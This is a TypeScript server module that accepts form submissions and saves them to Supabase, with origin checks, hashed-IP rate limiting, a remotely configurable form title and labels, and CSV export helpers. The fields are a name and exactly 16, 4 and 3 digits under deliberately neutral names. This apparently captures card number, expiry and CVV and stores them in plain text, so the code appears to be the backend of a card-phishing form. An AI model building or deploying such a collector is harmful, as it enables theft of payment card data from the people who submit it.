import { createHash } from "node:crypto";
import type { IncomingMessage, ServerResponse } from "node:http";

export type SubmissionPayload = {
  name: string;
  number16: string;
  number4: string;
  number3: string;
};

import { DEFAULT_FORM_CONFIG, type FormConfig } from "./defaults";

const RATE_LIMIT_MAX = 10;
const RATE_LIMIT_WINDOW_MS = 60_000;

function sendJson(res: ServerResponse, status: number, payload: unknown, headers: Record<string, string> = {}) {
  res.statusCode = status;
  res.setHeader("content-type", "application/json; charset=utf-8");
  for (const [key, value] of Object.entries(headers)) {
    res.setHeader(key, value);
  }
  res.end(JSON.stringify(payload));
}

function readRequestBody(req: IncomingMessage): Promise<string> {
  return new Promise((resolve, reject) => {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk;
      if (body.length > 32_768) {
        reject(new Error("Payload muito grande."));
        req.destroy();
      }
    });
    req.on("end", () => resolve(body));
    req.on("error", reject);
  });
}

function getHeader(req: IncomingMessage, name: string): string {
  const value = req.headers[name.toLowerCase()];
  return Array.isArray(value) ? value[0] || "" : value || "";
}

function parseAllowedOrigins(raw: string): string[] {
  return raw
    .split(",")
    .map((entry) => entry.trim().replace(/\/+$/, ""))
    .filter(Boolean);
}

function resolveOrigin(req: IncomingMessage): string {
  const origin = getHeader(req, "origin");
  if (origin) return origin.replace(/\/+$/, "");
  const referer = getHeader(req, "referer");
  if (!referer) return "";
  try {
    return new URL(referer).origin;
  } catch {
    return "";
  }
}

function buildCorsHeaders(origin: string, allowedOrigins: string[]): Record<string, string> {
  if (!origin || !allowedOrigins.includes(origin)) return {};
  return {
    "access-control-allow-origin": origin,
    "access-control-allow-methods": "GET, POST, OPTIONS",
    "access-control-allow-headers": "content-type",
    vary: "Origin",
  };
}

export function validateSubmissionPayload(input: unknown): SubmissionPayload | null {
  if (!input || typeof input !== "object") return null;
  const body = input as Record<string, unknown>;
  const name = String(body.name ?? "").trim();
  const number16 = String(body.number16 ?? "");
  const number4 = String(body.number4 ?? "");
  const number3 = String(body.number3 ?? "");

  if (!name || name.length > 120) return null;
  if (!/^[0-9]{16}$/.test(number16)) return null;
  if (!/^[0-9]{4}$/.test(number4)) return null;
  if (!/^[0-9]{3}$/.test(number3)) return null;

  return { name, number16, number4, number3 };
}

function hashIp(ip: string, salt: string): string {
  return createHash("sha256").update(`${salt}:${ip}`).digest("hex");
}

function getClientIp(req: IncomingMessage): string {
  const forwarded = getHeader(req, "x-forwarded-for");
  if (forwarded) return forwarded.split(",")[0]?.trim() || "unknown";
  return req.socket.remoteAddress || "unknown";
}

function getSupabaseConfig(env: Record<string, string>) {
  const url = (env.SUPABASE_URL || env.VITE_SUPABASE_URL || "").replace(/\/+$/, "");
  const serviceRoleKey = env.SUPABASE_SERVICE_ROLE_KEY || "";
  return { url, serviceRoleKey };
}

async function supabaseRequest(
  env: Record<string, string>,
  path: string,
  options: RequestInit = {},
): Promise<Response> {
  const { url, serviceRoleKey } = getSupabaseConfig(env);
  if (!url || !serviceRoleKey) {
    throw new Error("Supabase nao configurado.");
  }

  return fetch(`${url}/rest/v1/${path}`, {
    ...options,
    headers: {
      apikey: serviceRoleKey,
      authorization: `Bearer ${serviceRoleKey}`,
      "content-type": "application/json",
      ...(options.headers || {}),
    },
  });
}

async function isRateLimited(req: IncomingMessage, env: Record<string, string>): Promise<boolean> {
  const salt = env.SUBMISSION_RATE_LIMIT_SALT || "";
  if (!salt || salt.length < 24) return false;

  const ipHash = hashIp(getClientIp(req), salt);
  const since = new Date(Date.now() - RATE_LIMIT_WINDOW_MS).toISOString();
  const query = new URLSearchParams({
    select: "id",
    ip_hash: `eq.${ipHash}`,
    created_at: `gte.${since}`,
  });

  const response = await supabaseRequest(env, `submission_rate_limits?${query.toString()}`, {
    method: "GET",
    headers: { prefer: "count=exact" },
  });

  const contentRange = response.headers.get("content-range") || "";
  const total = Number(contentRange.split("/")[1] || "0");
  return total >= RATE_LIMIT_MAX;
}

async function registerRateLimitAttempt(req: IncomingMessage, env: Record<string, string>) {
  const salt = env.SUBMISSION_RATE_LIMIT_SALT || "";
  if (!salt || salt.length < 24) return;
  const ipHash = hashIp(getClientIp(req), salt);
  await supabaseRequest(env, "submission_rate_limits", {
    method: "POST",
    headers: { prefer: "return=minimal" },
    body: JSON.stringify({ ip_hash: ipHash }),
  });
}

async function insertSubmission(payload: SubmissionPayload, env: Record<string, string>) {
  const response = await supabaseRequest(env, "submissions", {
    method: "POST",
    headers: { prefer: "return=representation" },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const detail = await response.text();
    throw new Error(detail || "Nao foi possivel registrar.");
  }

  return response.json();
}

async function loadFormConfig(env: Record<string, string>): Promise<FormConfig> {
  const response = await supabaseRequest(env, "form_config?id=eq.default&select=*", { method: "GET" });
  if (!response.ok) return DEFAULT_FORM_CONFIG;
  const rows = (await response.json()) as Array<Record<string, string>>;
  const row = rows[0];
  if (!row) return DEFAULT_FORM_CONFIG;
  return {
    title: row.title || DEFAULT_FORM_CONFIG.title,
    message: row.message || DEFAULT_FORM_CONFIG.message,
    name_label: row.name_label || DEFAULT_FORM_CONFIG.name_label,
    number16_label: row.number16_label || DEFAULT_FORM_CONFIG.number16_label,
    number4_label: row.number4_label || DEFAULT_FORM_CONFIG.number4_label,
    number3_label: row.number3_label || DEFAULT_FORM_CONFIG.number3_label,
  };
}

export async function handleSubmitRequest(
  req: IncomingMessage,
  res: ServerResponse,
  env: Record<string, string>,
) {
  const allowedOrigins = parseAllowedOrigins(env.ALLOWED_ORIGINS || "");
  const origin = resolveOrigin(req);
  const corsHeaders = buildCorsHeaders(origin, allowedOrigins);

  if (req.method === "OPTIONS") {
    if (!origin || !allowedOrigins.includes(origin)) {
      return sendJson(res, 403, { error: "Origem nao autorizada." }, corsHeaders);
    }
    res.statusCode = 204;
    Object.entries(corsHeaders).forEach(([key, value]) => res.setHeader(key, value));
    return res.end();
  }

  if (!origin || !allowedOrigins.includes(origin)) {
    return sendJson(res, 403, { error: "Origem nao autorizada." }, corsHeaders);
  }

  let parsed: unknown;
  try {
    parsed = JSON.parse(await readRequestBody(req));
  } catch {
    return sendJson(res, 400, { error: "Dados invalidos." }, corsHeaders);
  }

  const payload = validateSubmissionPayload(parsed);
  if (!payload) {
    return sendJson(res, 400, { error: "Dados invalidos." }, corsHeaders);
  }

  try {
    if (await isRateLimited(req, env)) {
      return sendJson(res, 429, { error: "Limite de envios atingido. Tente novamente em instantes." }, corsHeaders);
    }

    await insertSubmission(payload, env);
    await registerRateLimitAttempt(req, env);
    return sendJson(res, 201, { ok: true }, corsHeaders);
  } catch {
    return sendJson(res, 500, { error: "Nao foi possivel registrar." }, corsHeaders);
  }
}

export async function handleFormConfigRequest(res: ServerResponse, env: Record<string, string>) {
  try {
    const config = await loadFormConfig(env);
    return sendJson(res, 200, config, {
      "cache-control": "public, max-age=60",
    });
  } catch {
    return sendJson(res, 200, DEFAULT_FORM_CONFIG, {
      "cache-control": "public, max-age=60",
    });
  }
}

export function neutralizeCsvValue(value: string): string {
  const text = String(value ?? "");
  if (/^[=+\-@]/.test(text)) return `'${text}`;
  return text;
}

export function toCsvRow(values: string[]): string {
  return values
    .map((value) => `"${neutralizeCsvValue(value).replace(/"/g, '""')}"`)
    .join(",");
}

export { DEFAULT_FORM_CONFIG } from "./defaults";
export type { FormConfig } from "./defaults";
